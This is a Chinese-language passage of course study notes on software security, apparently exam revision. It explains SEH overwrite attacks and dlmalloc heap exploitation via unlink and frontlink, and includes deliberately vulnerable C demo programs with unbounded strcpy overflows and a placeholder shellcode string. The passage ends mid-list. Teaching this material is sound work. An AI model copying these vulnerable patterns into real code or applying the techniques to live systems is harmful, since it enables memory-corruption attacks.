<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2050.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2051.png" alt="image.png"></p>
<p>2.SEH处理流程</p>
<p>（1）SEH结构体<strong>存放在系统栈中</strong>。当<strong>线程初始化</strong>时会自动向<strong>栈</strong>中<strong>安装一个SEH</strong>，作为<strong>线程默认的异常处理。</strong></p>
<p>（2）如果程序源代码中使用了_try{}_except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中<strong>安装一个SEH来实现异常处理。</strong></p>
<p>（3）栈中一般<strong>会同时存在多个SEH。</strong>栈中的多个SEH通过<strong>链表指针</strong>在栈内<strong>由栈顶向栈底串成单向链表</strong>，位于链表<strong>最顶端</strong>的SEH通过<strong>TEB(线程环境块)0字节偏移处的指针标识。</strong></p>
<p>（4）当异常发生时，<strong>操作系统会中断程序</strong>，并首先从TEB的0字节偏移处取出<strong>距离栈顶最近的SEH</strong>，使用<strong>异常处理函数句柄</strong>所指向的代码来处理异常。</p>
<p>（5）当离事故现场最近的异常处理函数运行失败时，将顺着SEH链表<strong>依次尝试其他的异常处理函数。</strong></p>
<p>（6）如果程序安装的所有异常处理函数都不能处理，系统将采用<strong>默认的异常处理函数</strong>。通常这个函数会弹出一个对话框，然后<strong>强制关闭</strong>程序。</p>
<p>3.SEH攻击</p>
<p><strong>思路：将异常处理函数的指针，替换成shellcode的指针</strong>。SafeSEH和SEHOP，微软的新seh，无法被利用了。</p>
<p>（1）SEH存放在<strong>栈内</strong>，我们可以<strong>精心制造出溢出数据</strong>来<strong>把SEH的异常处理的函数地址替换为shellcode的起始地址。</strong></p>
<p>（2）溢出后<strong>错误的栈帧或堆块数据</strong>往往会触发异常，我们能查到<strong>哪些能触发异常的片段。</strong></p>
<p>（3）当Windows开始处理溢出后的异常时<strong>会调用shellcode</strong>，它会<strong>把shellcode当作异常函数来处理</strong>异常。</p>
<p>4.SEH代码事例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=<span class="string">&quot;\x90\x90…&quot;</span>;</span><br><span class="line"><span class="comment">// 由于我们要得到shellcode起始位置，SEH地址等信息，所以我们先用0x90来进行填充</span></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;got an exception,press Enter to kill process!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="comment">// 这是我们自己编写的异常处理函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* input)</span>&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">_asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//int 3指令**可以中断进程开始调试**</span></span><br><span class="line">_try&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf,input);<span class="comment">// 产生栈溢出。</span></span><br><span class="line">zero=<span class="number">4</span>/zero;<span class="comment">// 除0产生异常</span></span><br><span class="line">&#125;</span><br><span class="line">_except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>（1）函数test中存在典型的栈溢出漏洞。</p>
<p>（2）_try{}会在test的函数栈帧中<strong>安装一个SEH结构。</strong></p>
<p>（3）_try中的<strong>除0操作</strong>会<strong>产生一个异常</strong></p>
<p>（4）当strcpy操作没有产生溢出时，除0操作的异常将最终被MyExceptionHandler函数处理。</p>
<p>（5）当strcpy操作<strong>产生溢出</strong>，并精确地将栈帧中的<strong>SEH异常处理句柄修改为shellcode的入口地址时，</strong>操作系统将会错误地使用shellcode去处理除0异常，代码植入成功。</p>
<p>（6）此外，异常处理机制会检测进程是否处于调试状态。如果直接用调试器加载程序，异常处理会进入调试状态下的处理流程。因此<strong>我们在代码中加入断点_asm int 3</strong>，让进程中断，然后<strong>用调试器attach的方法进行调试。</strong></p>
<p><em>（考过选择题，没有<strong>SEH</strong>啊）5.Windows内存安全机制概述：*<em>GS编译、DEP、Heap cookie、Safe Unlink、ASLR</em></em></p>
<h2 id="动态内存安全"><a href="#动态内存安全" class="headerlink" title="动态内存安全"></a>动态内存安全</h2><h3 id="动态内存管理概述"><a href="#动态内存管理概述" class="headerlink" title="动态内存管理概述"></a>动态内存管理概述</h3><p>1.动态内存管理函数（知道每个函数作用）</p>
<p>（1）C标准定义的内存分配函数：calloc()、malloc()、realloc()。</p>
<p>（2）使用free()函数释放内存，C++使用<strong>new表达式</strong>分配内存，使用<strong>delete表达式</strong>释放内存。</p>
<p>（3）malloc(size_t size)：<strong>分配size个字节，</strong>并返回一个<strong>指向分配的内存的指针。</strong>分配的内存<strong>未被初始化为一个已知值</strong>。</p>
<p>（4）free(void * p)：<strong>释放由p指向的内存空间</strong>，这个p必须是先前通过调用malloc()，calloc()，或者realloc()返回的。<strong>如果free(p)此前已经被调用过，将会导致未定义行为；如果p是空指针，则不执行任何操作。</strong></p>
<p>（5）realloc(void <em>p, size_t size)：<strong>将p所指向的内存块的大小改为size个字节。</strong>新大小和旧大小中较小的值那部分内存所包含的内容不变。<strong>新分配的内存未做初始化。</strong>如果<strong>p是空指针，</strong>则该调用<strong>等价于malloc(size)。</strong>如果size等于0，则该调用*<em>等价于free(p)。如果p不是空指针，则其必须是早先调用malloc()，calloc()，或者realloc()所返回的结果。</em></em></p>
<p>（6）calloc(size_t nmemb, size_t size)：为数组分配内存，<strong>该数组共有nmemb个元素，每个元素的大小为size个字节，</strong>并返回一个<strong>指向所分配的内存的指针</strong>。<strong>所分配的内存的内容全部被设置为0。</strong></p>
<p>2.内存管理器</p>
<p>（1）既管理<strong>已分配的内存，</strong>也管理<strong>已释放的内存。</strong>作为<strong>客户进程的一部分运行。</strong></p>
<p>（2）内存分配的不同算法</p>
<p>①<strong>连续匹配方法</strong>。查询匹配的<strong>第一个空闲块（从当前开始）</strong></p>
<p>②<strong>最先</strong>匹配。从<strong>内存开始位置</strong>寻找第一个空闲块。</p>
<p>③<strong>最佳</strong>匹配。选择大小满足要求（&gt;&#x3D;），且最小的块。（恰好）   </p>
<p>④最优匹配：对空闲块取样，选取第一个比样本更合适的块，返回最优结婚策略。</p>
<p>⑤最差匹配：挑最大的空闲块</p>
<p>⑥伙伴系统方法：以前的方法可能导致片段化；伙伴系统<strong>只分配$2^i$大小的块</strong>；倘若<strong>需要m</strong>大小的块，<strong>分配$2^{[\log_b m]}+1$<strong>大小；当块返回时，</strong>尝试和它相邻的同样大小的块合并。</strong></p>
<p>⑦<strong>隔离</strong>。保持<strong>单独的大小一致的块</strong>的列表。一直都是2、4、6的大小的块。   </p>
<p>（3）<strong>返回已释放的块到池中，合并临近空闲块为更大的块，有时使用压缩的预留块，</strong>把所有块移到一起。</p>
<h3 id="常见的内存管理错误"><a href="#常见的内存管理错误" class="headerlink" title="常见的内存管理错误"></a>常见的内存管理错误</h3><p><strong>（考过）初始化错误、未检查返回值、引用已释放内存、对同一块内存释放多次、不正确配对的内存管理函数（new对delete才对）、未能区分标量和数组、分配函数使用不当（比如malloc(0)）。</strong></p>
<p>1.初始化错误</p>
<p>（1）程序员假设<strong>malloc()把分配的内存的所有位初始化为零</strong></p>
<p>（2）初始化<strong>大</strong>的内存块<strong>可能会降低性能</strong>并且<strong>不总是必要的</strong>：<strong>程序员必须用memset()或通过调用calloc()初始化内存，它们都将内存清零</strong></p>
<p>考试练习题（解答题，看看）：该段代码存在什么错误？如何修复？</p>
<p>（1）int *y &#x3D; malloc(n * sizeof(int))：<strong>分配的内存包含随机值</strong>，y[i]<strong>没有被初始化为0</strong>。<strong>需要调用calloc()将内存清零。</strong></p>
<p>（2）没有检查内存分配是否成功，函数返回局部变量的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* return y = Ax */</span></span><br><span class="line"><span class="type">int</span> *<span class="title function_">matvec</span><span class="params">(<span class="type">int</span> **A, <span class="type">int</span> *x, <span class="type">int</span> n)</span> &#123; </span><br><span class="line"><span class="type">int</span> *y = <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">y[i] += A[i][j] * x[j];</span><br><span class="line"><span class="comment">// y[i]初始化为零, 对么?</span></span><br><span class="line"><span class="comment">/* 第7行的赋值语句假定y[i]初始化为0，用memset()或通过调用calloc()初始化内存 */</span></span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.未检查返回值</p>
<p>（1）内存是<strong>有限的资源</strong>，它可能会被耗尽。</p>
<p>（2）内存分配函数报告调用者状态：VirtualAlloc()返回NULL、(MFC)new表达式抛出CMemoryException<em>、HeapAlloc()可能返回NULL或者产生结构化异常。应用程序应该：*<em>决定什么时候错误发生，以合适方式处理异常。</em></em></p>
<p>（3）<strong>如果不能分配请求的空间，那么malloc()函数返回一个空指针。</strong>在不能分配内存时，有个<strong>一致的恢复计划</strong>是需要的。</p>
<p>（4）PhkMalloc：提供了一个X选项，在启用主选项的情况下，当分配失败时，内存分配器会向标准错误输出设备打印一段诊断信息并调用abort()，而不是返回错误状态值。</p>
<p>（5）如果没有内存可分配的话，<strong>malloc返回空指针。</strong>C++中的<strong>new表达式抛出bad_alloc异常</strong>：使用new，将分配封装在try块中。</p>
<ul>
<li>检查malloc返回值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *i_ptr;</span><br><span class="line">i_ptr = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*nelements_wanted);</span><br><span class="line"><span class="keyword">if</span> (i_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">i_ptr[i] = i;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Couldn&#x27;t get the memory - recover */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>new表达式异常处理</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"> <span class="type">int</span> *pn = new <span class="type">int</span>;</span><br><span class="line"> <span class="type">int</span> *pi = new <span class="type">int</span>(<span class="number">5</span>); </span><br><span class="line"> <span class="type">double</span> *pd = new <span class="type">double</span>(<span class="number">55.9</span>); </span><br><span class="line"> <span class="type">int</span> *buf = new <span class="type">int</span>[<span class="number">10</span>]; </span><br><span class="line"> . . .</span><br><span class="line">&#125;</span><br><span class="line">catch (bad_alloc) &#123;</span><br><span class="line"> <span class="comment">// handle failure from new</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>不合语法！</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *pn = new <span class="type">int</span>;</span><br><span class="line"><span class="keyword">if</span> (pn) &#123; … &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; … &#125;</span><br><span class="line"><span class="comment">// 如果条件总是真的话，不管内存分配成功与否</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用像malloc的新方法的nothrow变种</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *pn = new(nothrow) <span class="type">int</span>;</span><br><span class="line"><span class="keyword">if</span> (pn) &#123; … &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; … &#125;</span><br></pre></td></tr></table></figure>

<p>3.引用已释放内存</p>
<p>（1）几乎总能成功，因为释放的内存是被<strong>内存管理器</strong>回收的</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/2e047133-7af7-4164-a90c-8d2194f98066.png" alt="image.png"></p>
<p>（2）不可能导致运行时错误：<strong>因为内存由内存管理器所有。</strong></p>
<p>（3）<strong>已释放的内存在读操作之前可被分配</strong>：读操作读取的数值不正确，写操作损坏其他变量。</p>
<p>（4）<strong>已释放内存能被内存管理器使用：</strong>写操作能损坏内存管理器元数据，很难诊断运行时错误，<strong>漏洞利用的基础。</strong></p>
<p>4.多次释放内存</p>
<p>（1）经常是剪切和粘贴错误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="comment">/* manipulate x */</span></span><br><span class="line"><span class="built_in">free</span>(x);</span><br><span class="line"></span><br><span class="line">y = <span class="built_in">malloc</span>(n * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="comment">/* manipulate y */</span></span><br><span class="line"><span class="built_in">free</span>(x);</span><br></pre></td></tr></table></figure>

<p>（2）数据结构包含指向同一项的链接</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2052.png" alt="image.png"></p>
<p>（3）错误处理：结果是<strong>内存块被释放</strong>，但在正常处理过程中再次被释放。一般来说<strong>内存泄露比双重释放更安全。</strong></p>
<p>5.不正确配对的内存管理函数</p>
<p>（1）总是使用：<strong>new←→delete、malloc←→free</strong></p>
<p>（2）有时不恰当的配对在某些平台仍能工作，但是代码是<strong>不可移植的。</strong></p>
<p>6.未能区分标量和数组：C++对于标量和数组有不同的表达式。<strong>new←→delete标量、new[]←→delete[]数组。</strong></p>
<p>7.分配函数的不当使用</p>
<p>（1）malloc(0)，即分配0字节：<strong>能导致内存管理错误，</strong>C运行时库能返回<strong>空指针和伪地址</strong>。最安全和便捷的解决方案是<strong>确保没有零长度分配。</strong></p>
<p><strong>（2）使用alloca()</strong></p>
<p>①功能：在调用者的栈中分配内存，<strong>在调用alloca()的函数返回时自动释放该内存</strong></p>
<p>②问题：通常实现为内联函数，不返回空的错误，分配空间时超出栈边界。</p>
<h3 id="dlmalloc"><a href="#dlmalloc" class="headerlink" title="dlmalloc"></a>dlmalloc</h3><p>1.dlmalloc管理内存块：<strong>空闲、分配。内存块要么被分配给进程，要么空闲。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2053.png" alt="image.png"></p>
<p>2.<strong>Dlmalloc空闲块</strong>管理</p>
<p>（1）<strong>以双链表形式组织起来</strong>，包含<strong>指向下一块的前向指针</strong>和<strong>指向上一块的后向指针</strong>，<strong>最后4字节存有该块的大小。</strong></p>
<p>（2）已分配块和空闲块都使用<strong>一个PREV_INUSE位区分</strong>：<strong>块大小总是偶数，PREV_INUSE位被存储于块大小的低位中。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2054.png" alt="image.png"></p>
<p>（3）空闲块被组织成<strong>筐</strong>，<strong>由头索引，筐中的块大约同样大小，</strong>还有一个包含<strong>最近释放的块</strong>的筐做为<strong>缓存</strong>。</p>
<p>（4）空闲块合并时：<strong>相邻空闲块，合并</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2055.png" alt="image.png"></p>
<p>3.解链技术：Unlink宏（记一下步骤）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123; </span></span><br><span class="line">FD = P -&gt; fd; </span><br><span class="line">BK = P -&gt; bk; </span><br><span class="line">FD -&gt; bk = BK; </span><br><span class="line">BK -&gt; fd = FD; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2056.png" alt="image.png"></p>
<p>unlink是一种<strong>攻击</strong>技术。利用缓冲区溢出来操作内存块的<strong>边界标志</strong>。用来攻击dlmalloc，覆盖先前的<strong>PREV_INUSE</strong>字段。可以<strong>任意写4字节数据</strong>。</p>
<p>考试练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> *first, *second, *third;</span><br><span class="line">first = <span class="built_in">malloc</span>(<span class="number">666</span>); <span class="comment">// 内存分配块 1</span></span><br><span class="line">second = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">// 内存分配块 2</span></span><br><span class="line">third = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">// 内存分配块 3</span></span><br><span class="line"><span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">free</span>(first); </span><br><span class="line"><span class="built_in">free</span>(second); </span><br><span class="line"><span class="built_in">free</span>(third); </span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>对于strcpy(first, argv[1])：程序接受单个字符串参数并将其复制到first中，无界strcpy()操作容易引发<strong>缓冲区溢出。</strong></li>
<li>程序调用free()<strong>释放第一块内存。</strong></li>
<li>如果第二块内存处于待分配状态（即空闲），free()操作<strong>将会试图将其与第一块合并。</strong></li>
<li>为了判断第二块内存是否处于空闲状态,free()会<strong>检查第3块的PREV_INUSE标志位。</strong></li>
<li>参数会覆写第二块内存中表示<strong>上一块内存大小的域、块大小值以及前向指针和后向指针</strong>，从而也就修改了free()操作的行为。</li>
<li>第二块内存的大小域的值被修改为-4，因此当free()需要确定第三块内存的位置时，也就是说<strong>将第二块内存的起始位置加上其大小时会导致将其起始位置减4。</strong>Doug Lea的malloc此时会错误地认为下一连续内存块<strong>自第二块内存前面4字节起。</strong></li>
<li>这个恶意参数也会使dlmalloc所找到的PREV_INUSE<strong>标志位为空</strong>，从而dlmalloc误以为<strong>第二块内存是未分配的</strong>，导致free()调用<strong>unlink()宏</strong>来合并这两块内存。</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2057.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2058.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2059.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2060.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2061.png" alt="image.png"></p>
<p>（3）unlink()宏<strong>将攻击者提供的4个字节的数据写到同样是由攻击者指定的4个字节的地址处。</strong></p>
<p>①一旦攻击者<strong>可以在任意地址处写入4字节数据</strong>，利用该漏洞程序本身的权限执行任意代码就变得简单多了。</p>
<p>②攻击者可能会<strong>提供栈中指令指针的地址</strong>，然后<strong>利用unlink()宏将该地址覆写为恶意代码的地址。</strong></p>
<p>③将漏洞程序调用的函数的地址<strong>替换为恶意代码的地址</strong>。</p>
<p>④攻击者可以检查程序的可执行映像，找到free()函数的调用跳槽（jump slot）地址：address-12处的值包含在恶意参数中，因此unlink()宏会将free()库函数调用地址覆写为shellcode的地址。每当程序调用free()时都会转而执行shellcode。</p>
<p>（4）对堆缓冲区溢出的利用并不是特别困难的事情：该利用方式最困难之处在于<strong>精确地确定第一块内存的大小</strong>，以便<strong>计算出需要覆写的第二块内存的地址。</strong>攻击者可以从dlmalloc中复制request2size(req,nb)宏的代码到其利用代码中，然后使用这个宏计算出块的大小。</p>
<p>4.Frontlink技术</p>
<p>（1）和unlink相比较，frontlink技术更难以应用但也很危险：当一块内存被释放时，<strong>它必须被正确地链接进双链表中</strong>。在dlmalloc的某些版本中，此项操作是由frontlink()代码段完成的。我们的目标是在<strong>攻击者指定的地址写入攻击者指定的数据。</strong></p>
<p>（2）实现：攻击者<strong>指定一个内存块的地址而不是shellcode的地址，在这个内存块的起始4个字节中放入可执行代码。</strong>通过<strong>往上一内存块的最后4个字节中写入指令</strong>实现的。</p>
<p>（3）练习题</p>
<p>攻击者提供恶意实参：包含一段shellcode，<strong>该shellcode的最后4个字节就是跳转到shellcode其他部分的跳转指令，</strong>并且这4个字节<strong>是first块的最后4个字节。</strong>为了确保该条件能够满足，<strong>被攻击的内存块必须是8的整数倍减去4个字节长。</strong></p>
<p>C语言代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123; <span class="keyword">if</span> (argc !=<span class="number">3</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: prog_name arg1 \n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *first, *second, *third;</span><br><span class="line"><span class="type">char</span> *fourth, *fifth, *sixth;</span><br><span class="line">first = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>);</span><br><span class="line">second = <span class="built_in">malloc</span>(<span class="number">1500</span>);</span><br><span class="line">third = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">fourth = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">fifth = <span class="built_in">malloc</span>(<span class="number">1508</span>);</span><br><span class="line">sixth = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(first, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">free</span>(fifth); </span><br><span class="line"><span class="built_in">strcpy</span>(fourth, argv[<span class="number">1</span>]); </span><br><span class="line"><span class="built_in">free</span>(second);</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>strcpy(first, argv[2])：将argv[2]复制到first块</li>
<li>free(fifth)：当fifth内存块被释放时，它被放入<strong>一个筐中（1508）</strong></li>
